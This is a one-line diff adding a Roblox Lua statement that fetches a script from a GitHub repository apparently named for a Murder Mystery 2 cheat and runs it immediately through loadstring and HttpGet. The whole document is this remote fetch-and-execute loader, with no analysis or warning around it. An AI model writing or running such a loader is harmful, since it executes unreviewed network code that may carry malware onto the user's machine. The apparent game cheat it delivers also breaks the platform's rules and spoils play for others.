@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Xvlamer/mm2-script/refs/heads/main/mm2%20script", true))()
